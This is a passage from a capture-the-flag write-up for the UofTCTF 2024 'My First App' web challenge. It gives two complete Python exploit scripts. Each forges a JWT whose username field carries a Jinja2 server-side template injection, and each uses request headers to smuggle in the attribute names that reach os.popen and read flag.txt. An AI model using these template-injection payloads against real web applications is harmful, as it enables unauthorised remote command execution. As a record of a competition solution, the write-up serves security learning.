import_func = f"({builtins}|attr({getitem}))({import_dunder})" # <class 'warnings.catch_warnings'>()._module.__builtins__.__getitem__("__import__") = <built-in function __import__>

os_str = f"{request_headers}.get({six})" # request.headers.get("6") = "os"
os = f"{import_func}({os_str})" # <built-in function __import__>("os") = <module 'os' (frozen)>

popen_str = f"{request_headers}.get({seven})" # request.headers.get("7") = "popen"
popen_func = f"{os}|attr({popen_str})" # <module 'os' (frozen)>.popen

cmd = f"{request_headers}.get({eight})" # request.headers.get("8") = our cmd
popen = f"{popen_func}({cmd})" # <module 'os' (frozen)>.popen(cmd)

read_str = f"{request_headers}.get({nine})" # request.headers.get("9") = "read"
popen_read = f"({popen}|attr({read_str}))()"  # <module 'os' (frozen)>.popen(cmd).read()

payload = "{{" + popen_read + "}}"

headers = {
    "Pragma": "0123456789",
    "Referer": "__getitem__",
    "Content-Type": "headers",
    "0": "__class__",
    "1": "__mro__",
    "2": "__subclasses__",
    "3": "_module",
    "4": "__builtins__",
    "5": "__import__",
    "6": "os",
    "7": "popen",
    "8": "cat flag.txt", # cmd
    "9": "read",
}

auth = jwt.encode({"username": payload}, "torontobluejays", algorithm="HS256")

print(payload)

response = requests.get('https://uoftctf-my-first-app.chals.io/dashboard', cookies={"auth_token":auth}, headers=headers)

if '500' in response.text:
    print('Internal Server Error')
elif 'BLOCKED' in response.text:
    print(response.text)
else:
    result = response.text.split('\n')[15][38:-6]
    print(html.unescape(result))
{% endccb %}

we finally get the flag:

{% ccb terminal:true %}
uoftctf{That_firewall_salesperson_scammed_me_:(}
{% endccb %}

## we have ran out of header names (cleaner solution)

"Ireland without the RE" wrote [a writeup](https://ireland.re/posts/UofTCTF_2024_Web/#webmy-first-app) which by using `request.pragma.0` and sending multiple of the same header key

```http
Pragma: __globals__
Pragma: __getitem__
Pragma: __builtins__
Pragma: __import__
Pragma: os
Pragma: popen
Pragma: cat flag.txt
Pragma: read
```

They also used a shorter payload of `lipsum.__globals__.__getitem__('__builtins__').__import__.os.popen()`

I wrote a script to send their payload:

```py
import requests
import jwt
import html

# https://stackoverflow.com/a/16790967
class uniquestr(str):
    _lower = None
    def __hash__(self):
        return id(self)
    def __eq__(self, other):
        return self is other
    def lower(self):
        if self._lower is None:
            lower = str.lower(self)
            if str.__eq__(lower, self): 
                self._lower = self
            else:
                self._lower = uniquestr(lower)
        return self._lower

payload = "{{lipsum|attr(request.pragma.0)|attr(request.pragma.1)(request.pragma.2)|attr(request.pragma.1)(request.pragma.3)(request.pragma.4)|attr(request.pragma.5)(request.pragma.6)|attr(request.pragma.7)()}}"

headers = {
    uniquestr('Pragma'): '__globals__', # request.pragma.0
    uniquestr('Pragma'): '__getitem__', # request.pragma.1
    uniquestr('Pragma'): '__builtins__',# request.pragma.2
    uniquestr('Pragma'): '__import__',  # etc...
    uniquestr('Pragma'): 'os',
    uniquestr('Pragma'): 'popen',
    uniquestr('Pragma'): 'cat flag.txt',
    uniquestr('Pragma'): 'read'
}

auth = jwt.encode({"username": payload}, "torontobluejays", algorithm="HS256")

print(payload)

response = requests.get('https://uoftctf-my-first-app.chals.io/dashboard', cookies={"auth_token":auth}, headers=headers)

if '500' in response.text:
    print('Internal Server Error')
elif 'BLOCKED' in response.text:
    print(response.text)
else:
    result = response.text.split('\n')[15][38:-6]
    print(html.unescape(result))
```